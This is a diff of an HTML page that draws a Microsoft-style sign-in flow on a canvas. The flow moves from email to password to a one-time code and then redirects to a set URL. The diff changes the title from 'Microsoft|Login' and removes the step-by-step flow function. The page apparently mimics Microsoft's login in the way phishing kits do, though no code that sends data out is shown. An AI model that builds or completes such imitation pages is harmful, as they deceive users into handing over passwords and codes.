@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Microsoft|Login/title>
+<title>Microsoft-style Canvas Sign-in</title>
 <style>
   :root { color-scheme: light; }
   html, body { height:100%; margin:0; }
@@ -359,30 +359,7 @@ function go(name) {
     shim.focus({preventScroll:true});
   }
 
-  function go(name){
-    if(state.loading) return;
-
-    if(state.step==="email" && name==="next"){
-      withLoading(() => { state.step="password"; state.focus="field"; focusShim(); });
-    }
-    else if(state.step==="password" && name==="next"){
-      withLoading(() => { state.step="sendcode"; state.focus="none"; });
-    }
-    else if(state.step==="password" && name==="back"){
-      withLoading(() => { state.step="email"; state.focus="field"; focusShim(); });
-    }
-    else if(state.step==="sendcode" && name==="send"){
-      withLoading(() => { state.step="otp"; state.focus="otp"; state.otp=["","","","","",""]; state.otpIndex=0; focusShim(); });
-    }
-    else if(state.step==="otp" && (name==="back"||name==="backchev")){
-      withLoading(() => { state.step="sendcode"; state.focus="none"; });
-    }
-    else if(state.step==="otp" && name==="verify"){
-      state.loading = true; draw();
-      setTimeout(() => { window.location.href = REDIRECT_URL; }, TRANSITION_DELAY_MS);
-      return;
-    }
-  }
+  
 
   canvas.addEventListener("pointerdown",(e)=>{
     if(state.loading) return;
